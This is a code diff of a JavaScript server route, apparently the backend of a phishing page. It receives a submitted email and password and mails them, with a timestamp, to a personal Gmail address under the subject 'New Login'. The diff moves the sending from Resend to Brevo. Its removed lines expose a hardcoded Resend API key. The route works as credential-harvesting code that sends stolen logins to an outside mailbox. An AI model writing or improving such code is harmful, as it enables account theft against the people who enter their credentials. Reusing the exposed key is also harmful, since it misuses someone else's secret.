@@ -1,18 +1,15 @@
-import { Octomailer, ResendProvider } from 'octomailer';
+import { BrevoClient } from '@getbrevo/brevo';
 
-// Initialize Resend provider with your API key
-const resendProvider = new ResendProvider('re_Q4KZv3KR_Juem3AjtzTDEtMas8Bxbzg46', 1);
-const mailer = new Octomailer([resendProvider]);
-
+const client = new BrevoClient({ apiKey: process.env.BREVO_API_KEY });
 export async function POST(req) {
   const { eparams, password } = await req.json();
 
   try {
-    await mailer.send({
-      to: 'timmyleeokoduwa7@gmail.com',
-      from: 'onboarding@resend.dev',
+    await client.transactionalEmails.sendTransacEmail({
+      to: [{ email: 'timothyokoduwa4@gmail.com' }],
+      sender: { email: 'timmyleeokoduwa7@gmail.com', name: 'Your App' },
       subject: 'New Login',
-      text: `
+      textContent: `
 New login:
 -------------------
 Email: ${eparams}
@@ -22,14 +19,9 @@ Time: ${new Date().toLocaleString()}
       `
     });
 
-    return new Response(
-      JSON.stringify({ message: "Data sent!" }),
-      { status: 200 }
-    );
+    return new Response(JSON.stringify({ message: "Data sent!" }), { status: 200 });
   } catch (error) {
     console.error("Error:", error);
-    return new Response(JSON.stringify({ error: error.message }), {
-      status: 500
-    });
+    return new Response(JSON.stringify({ error: error.message }), { status: 500 });
   }
 }
